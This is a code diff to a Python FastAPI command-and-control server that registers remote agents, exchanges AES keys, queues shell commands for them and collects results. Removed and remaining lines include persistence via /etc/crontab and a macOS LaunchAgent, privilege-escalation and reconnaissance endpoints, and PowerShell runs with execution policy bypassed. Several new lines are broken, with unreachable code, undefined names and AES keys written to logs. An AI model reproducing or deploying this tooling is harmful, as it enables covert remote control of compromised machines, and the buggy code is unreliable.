@@ -8,9 +8,10 @@
 # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 ######################################################################################################################################################################################################################
 
-from fastapi import FastAPI, HTTPException, Query
+from fastapi import FastAPI, HTTPException, Query, Depends
+from fastapi.responses import JSONResponse
 from pydantic import BaseModel
-from typing import Dict, List
+from typing import Dict, List, Optional
 import logging
 import base64
 import gzip
@@ -18,15 +19,60 @@ import shutil
 from io import BytesIO
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
+from Crypto.Hash import HMAC, SHA256
 import uvicorn
 import os
 import paramiko
 
 app = FastAPI()
-agents: Dict[str, Dict] = {}
+agent_results = {}
+
+# Define the Agent model
+class Agent(BaseModel):
+    agent_id: str
+    status: str
+    last_checkin: str
+
+# Access agent data
+agents = {
+    "agent-001": {"status": "online", "last_checkin": "2025-02-27T12:00:00"},
+    "agent-002": {"status": "offline", "last_checkin": "2025-02-26T11:45:00"}
+}
 
 # Logging configuration
 logging.basicConfig(filename="c2_server.log", level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
+
+@app.get("/agents", response_model=List[Agent])
+async def list_agents():
+    try:
+        online_agents = [Agent(agent_id=key, status=value["status"], last_checkin=value["last_checkin"]) for key, value in agents.items() if value["status"] == "online"]
+        return online_agents
+    except Exception as e:
+        logging.error(f"Error listing agents: {str(e)}")
+        raise HTTPException(status_code=500, detail="Internal Server Error")
+
+# Endpoint to select an agent
+@app.post("/select_agent")
+async def select_agent(agent_id: str):
+    # Simulate selecting an agent and returning a response
+    agent = next((agent for key, agent in agents.items() if key == agent_id), None)
+    if agent and agent['status'] == 'online':
+        return {"status": "success", "message": f"Agent {agent_id} selected"}
+    else:
+        raise HTTPException(status_code=404, detail="Agent not found or offline")
+
+# Other endpoints like executing commands, etc. can be added here...
+
+class ResultPayload(BaseModel):
+    AgentID: str
+    Result: str
+
+class SendCommandRequest(BaseModel):
+    AgentID: str
+    Command: str
+
+class KeyRequest(BaseModel):
+    AgentID: str
 
 class CheckinRequest(BaseModel):
     AgentID: str
@@ -96,13 +142,20 @@ def encrypt_data(data: str, key: bytes) -> str:
 def decrypt_data(data: str, key: bytes) -> str:
     key = check_key_length(key)
     try:
+        # Decode Base64 input
         raw_data = base64.b64decode(data)
+
+        # Extract Nonce, CipherText, and Tag
         nonce = raw_data[:12]
-        cipher_text = raw_data[12:-16]
         tag = raw_data[-16:]
+        cipher_text = raw_data[12:-16]
+
+        # AES-GCM Decryption
         cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
         decrypted_text = cipher.decrypt_and_verify(cipher_text, tag)
+
         return decrypted_text.decode('utf-8')
+
     except Exception as e:
         logging.error(f"Decryption failed: {str(e)}")
         raise HTTPException(status_code=400, detail="Decryption failed")
@@ -116,71 +169,112 @@ def decrypt_aes_key(enc_aes_key_base64, private_key):
     enc_aes_key = base64.b64decode(enc_aes_key_base64)
     cipher_rsa = PKCS1_OAEP.new(private_key)
     aes_key = cipher_rsa.decrypt(enc_aes_key)
+
+    # Debug Output: Ensure AES Key is 32 bytes
+    logging.debug(f"[DEBUG] AES Key Length: {len(aes_key)} bytes")
+    if len(aes_key) != 32:
+        raise ValueError(f"[ERROR] AES Key must be 32 bytes! Received {len(aes_key)} bytes.")
+
     return aes_key
 
+def compute_hmac(data: str, key: bytes) -> str:
+    hmac = HMAC.new(key, msg=data.encode(), digestmod=SHA256)
+    return base64.b64encode(hmac.digest()).decode('utf-8')
+
 private_key = load_private_key()
+
+# Enable detailed logging
+logging.basicConfig(level=logging.DEBUG)
+
+@app.post("/checkin")
+async def checkin(request: CheckinRequest):
+    # Log the incoming request data for debugging
+    logging.debug(f"Incoming checkin request: {request}")
+    
+    agent_id = request.AgentID
+    if agent_id not in agents:
+        agents[agent_id] = {"status": "online", "last_checkin": "2025-02-27T12:00:00"}
+        logging.info(f"Agent {agent_id} checked in (new).")
+        return {"Status": "Agent registered"}
+    else:
+        logging.info(f"Agent {agent_id} already registered. Current Status: {agents[agent_id]['status']}")
+        return {"Status": "Agent already registered"}
 
 @app.post("/exchange_key")
 def exchange_key(request: KeyExchangeRequest):
     agent_id = request.AgentID
     enc_aes_key = request.EncAESKey
     try:
+        # Decrypt the AES key using the private RSA key
         aes_key = decrypt_aes_key(enc_aes_key, private_key)
+        
         if len(aes_key) != 32:
             raise ValueError("Invalid AES key length after decryption!")
 
-        agents[agent_id] = {"aes_key": aes_key, "commands": [], "results": []}
-        logging.info(f"Key exchange successful for AgentID: {agent_id}")
+        # Update or create the agent record with the AES key
+        if agent_id in agents:
+            agents[agent_id]["aes_key"] = aes_key
+        else:
+            agents[agent_id] = {"aes_key": aes_key, "commands": [], "results": []}
+        
+        logging.info(f"Key exchange successful for AgentID: {agent_id} - AES Key (Base64): {base64.b64encode(aes_key).decode()}")
         return {"Status": "Success"}
     except Exception as e:
         logging.error(f"Key exchange failed for AgentID {agent_id}: {str(e)}")
         raise HTTPException(status_code=400, detail="Key exchange failed")
+        
+        
+@app.post("/send_command")
+async def send_command(request: CommandRequest):
+    return {"status": "success", "agent_id": request.AgentID, "command": request.Command}
+
+    print(f"[DEBUG] Received send_command request: {agent_id}, {command}")
+
+    if agent_id not in agents:
+        print("[ERROR] Agent not found.")
+        return JSONResponse(content={"error": "Agent not found"}, status_code=404)
+
+    # Ensure "commands" exists
+    if "commands" not in agents[agent_id]:
+        agents[agent_id]["commands"] = []  
+
+    agents[agent_id]["commands"].append(command)
+    print(f"[DEBUG] Command queued for agent {agent_id}: {command}")
+
+    return {"status": "success"}
+
 
 @app.post("/beacon")
-def beacon(request: BeaconRequest):
-    agent_id = request.AgentID
-    if agent_id not in agents:
-        raise HTTPException(status_code=404, detail="Agent not found")
-    
-    aes_key = agents[agent_id]["aes_key"]
-    
-    if agents[agent_id]["commands"]:
-        command = agents[agent_id]["commands"].pop(0)
-        response = encrypt_data(command, aes_key)
-        logging.info(f"Sent command '{command}' to agent {agent_id}")
-    else:
-        response = encrypt_data("NoCommand", aes_key)
-        logging.info(f"No commands for agent {agent_id}")
-
-    return {"data": response}
-
-@app.post("/checkin")
-def checkin(request: CheckinRequest):
-    agent_id = request.AgentID
-    if agent_id not in agents:
-        agents[agent_id] = {"aes_key": None, "commands": [], "results": []}
-        logging.info(f"Agent {agent_id} checked in.")
-        return {"Status": "Agent registered"}
-    else:
-        logging.info(f"Agent {agent_id} already registered.")
-        return {"Status": "Agent already registered"}
-
-@app.post("/result")
-def result(request: ResultRequest):
+async def beacon(request: BeaconRequest):
     agent_id = request.AgentID
     if agent_id not in agents:
         raise HTTPException(status_code=404, detail="Agent not found")
 
-    try:
-        decrypted_result = decrypt_data(request.Result, agents[agent_id]["aes_key"])
-        agents[agent_id]["results"].append(decrypted_result)
+    if "commands" not in agents[agent_id]:
+        return {"commands": []}
 
-        message = f"Agent {agent_id} executed command with result: {decrypted_result}"
-        logging.info(message)
-        print(message, flush=True)  # Print for real-time monitoring
-    except Exception as e:
-        logging.error(f"Failed to process result from agent {agent_id}: {str(e)}")
-        raise HTTPException(status_code=400, detail="Decryption failed")
+    commands = agents[agent_id]["commands"]
+    agents[agent_id]["commands"] = []  # Clear commands after sending
+    logging.info(f"Beacon request from agent {agent_id}. Commands: {commands}")
+    return {"commands": commands}
+
+@app.get("/result")
+async def get_result(agent_id: str):
+    if agent_id in agent_results:
+        return {"Result": agent_results[agent_id]}
+    
+    raise HTTPException(status_code=404, detail="No result found for this agent")
+    
+        
+@app.post("/post_result")
+def post_result(payload: ResultPayload):
+    """Receive command execution results from an agent."""
+    if payload.AgentID not in [agent["agent_id"] for agent in agents]:
+        raise HTTPException(status_code=404, detail="Agent not found.")
+    
+    command_results[payload.AgentID] = payload.Result
+    
+    return {"status": "success", "message": "Result stored successfully"}
 
     return {"Status": "OK"}
 
@@ -243,106 +337,15 @@ def establish_persistence():
             script_path = os.path.join(os.path.dirname(__file__), 'windows', 'persistence.ps1')
             result = os.system(f"powershell -ExecutionPolicy Bypass -File {script_path}")
         elif os.name == 'posix':
-            cron_job = "@reboot /path/to/your/agent.sh"
-            with open("/etc/crontab", "a") as cron_file:
-                cron_file.write(cron_job + "\n")
-            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.macos.agent.plist")
-            with open(plist_path, 'w') as plist_file:
-                plist_file.write(f"""
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.macos.agent</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/bin/bash</string>
-        <string>/path/to/your/agent.sh</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-</dict>
-</plist>
-""")
-            os.system(f"launchctl load -w {plist_path}")
+            result = os.system("crontab -l")
     except Exception as e:
         logging.error(f"Error in establishing persistence: {str(e)}")
-        raise HTTPException(status_code=400, detail=f"Error in establishing persistence: {str(e)}")
-
-    logging.info("Persistence mechanism established.")
-    return {"Status": "OK"}
-
-@app.post("/escalate_privileges")
-def escalate_privileges():
-    result = None
-    try:
-        if os.name == 'nt':
-            script_path = os.path.join(os.path.dirname(__file__), 'windows', 'privilege_escalation.ps1')
-            result = os.system(f"powershell -ExecutionPolicy Bypass -File {script_path}")
-        elif os.name == 'posix':
-            command = "sudo -n true && echo 'Sudo access granted' || echo 'Sudo access denied'"
-            result = os.system(command)
-    except Exception as e:
-        logging.error(f"Error in escalating privileges: {str(e)}")
-        raise HTTPException(status_code=400, detail=f"Error in escalating privileges: {str(e)}")
-
-    logging.info("Privilege escalation attempted.")
-    return {"Status": "OK", "Result": result}
-
-@app.post("/gather_system_info")
-def gather_system_info():
-    system_info = {}
-    try:
-        if os.name == 'nt':
-            script_path = os.path.join(os.path.dirname(__file__), 'windows', 'reconnaissance.ps1')
-            result = os.popen(f"powershell -ExecutionPolicy Bypass -File {script_path}").read()
-            system_info["system_info"] = result
-        elif os.name == 'posix':
-            command = "uname -a && lsb_release -a && df -h && free -m"
-            result = os.popen(command).read()
-            system_info["system_info"] = result
-    except Exception as e:
-        logging.error(f"Error in gathering system info: {str(e)}")
-        raise HTTPException(status_code=400, detail=f"Error in gathering system info: {str(e)}")
-
-    logging.info("System information gathered.")
-    return {"Status": "OK", "SystemInfo": system_info}
-
-@app.post("/sendcommand")
-def send_command(request: CommandRequest):
-    agent_id = request.AgentID
-    command = request.Command
-    if agent_id in agents:
-        agents[agent_id]["commands"].append(command)
-        logging.info(f"Command received from CLI: {command}")
-        logging.info(f"Command sent to agent {agent_id}: {command}")
-        return {"Status": "Command sent"}
-    logging.error(f"Agent not found: {agent_id}")
-    raise HTTPException(status_code=404, detail="Agent not found")
-
-@app.get("/agents")
-def list_agents():
-    active_agents = [agent for agent, data in agents.items() if data.get("aes_key") is not None]  # Only list online agents
-    logging.info(f"Listing agents: {active_agents}")
-    return {"agents": [{"AgentID": agent} for agent in active_agents]}
+        raise HTTPException(status_code=400, detail=f"Error in persistence: {str(e)}")
     
-
-@app.get("/result")
-def get_result(agent_id: str = Query(..., alias="agent_id")):
-    if agent_id not in agents:
-        raise HTTPException(status_code=404, detail="Agent not found")
-
-    if agents[agent_id]["results"]:
-        result = agents[agent_id]["results"].pop(0)
-        logging.info(f"Fetched result for agent {agent_id}: {result}")
-        return {"Result": result}
-    else:
-        logging.info(f"No results available for agent {agent_id}")
-        return {"Result": "No result available"}
-
-def run_server():
-    uvicorn.run(app, host="0.0.0.0", port=8080, log_level="debug")
-
+    logging.info(f"Persistence established with result: {result}")
+    return {"Status": "OK", "Result": result}
+    
+# Run the FastAPI application
 if __name__ == "__main__":
-    run_server()
+    uvicorn.run(app, host="0.0.0.0", port=8080)
+
